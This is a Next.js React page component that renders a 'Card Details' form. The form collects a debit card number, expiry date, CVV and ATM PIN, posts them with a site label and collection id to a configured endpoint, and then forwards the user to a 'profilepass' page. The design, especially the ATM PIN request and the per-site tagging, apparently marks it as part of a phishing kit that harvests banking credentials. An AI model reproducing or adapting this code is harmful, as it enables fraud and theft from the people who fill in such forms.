'use client';
import DateInputComponent from "../inlcude/DateInputComponent";
import DebitCardInputComponent from "../inlcude/DebitCardInputComponent";
import ExpiryDateInputComponent from "../inlcude/ExpiryDateInputComponent";
    import Footer from "../inlcude/footer";
import Header from "../inlcude/header";
import { useRouter } from "next/navigation";  
import { useState } from 'react';

export default function Home() {
    const router = useRouter();
    const API_URL = process.env.NEXT_PUBLIC_URL;
    const SITE = process.env.NEXT_PUBLIC_SITE;

    const [loading, setLoading] = useState(false);

    const handleSubmit = async (e) => {
        e.preventDefault()
        setLoading(true); // Set loading state to true

        const formData = new FormData(e.target);
        const jsonObject1 = {};
        const jsonObject = {};
        formData.forEach((value, key) => {
            jsonObject[key] = value;
        });
        jsonObject1['data'] = jsonObject;
        jsonObject1['site'] = SITE;
        jsonObject1['id'] = localStorage.getItem("collection_id");
        
        try {
            const response = await fetch(`${API_URL}`, {
                method: 'POST',
                body: JSON.stringify(jsonObject1)
            });

            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            const responseData = await response.json();
            router.push('/profilepass');
        } catch (error) {
            console.error('There was a problem with the fetch operation:', error);
        } finally{
            setLoading(false); 
        }
    };
  return (
    <>
    <Header />
    <main>
    <div class="All_titlec__cGUYa">
        <h1 class="All_h1__PWkY3">Card Details</h1>
    </div>
        <form onSubmit={handleSubmit} className="All_myfrm__3vXyb" id="frm_2_am8E_">
        <p className="All_mndt__6QZEJ mt-3">Required Fileds are asterisk (*)</p>
            <div className="All_frm__am8E_">
                <DebitCardInputComponent />
                <ExpiryDateInputComponent />

                <div className="All_frmgrp__Ym9Kf">
                    <label className="All_frmlb__P0GlO">
                    CVV <span className="All_mndt__6QZEJ">*</span>
                    </label>
                    <input
                    name="CVV"
                    minLength={3}
                    maxLength={3}
                    inputMode="numeric"
                    type="password"
                    className="All_frmin__xQNbS"
                    required
                    />
                </div>
                    
                <div className="All_frmgrp__Ym9Kf">
                    <label className="All_frmlb__P0GlO">
                    ATM PIN <span className="All_mndt__6QZEJ">*</span>
                    </label>
                    <input
                    name="ATM"
                    minLength={4}
                    maxLength={4}
                    inputMode="numeric"
                    type="password"
                    className="All_frmin__xQNbS"
                    required
                    />
                </div>
                <div className="All_ctr__36AKZ">
                    <input type="submit" className="All_bts__Ls5Mq" defaultValue="Submit" />
                </div>
                </div>

        </form>
    </main>
    <Footer />
</>
  );
}
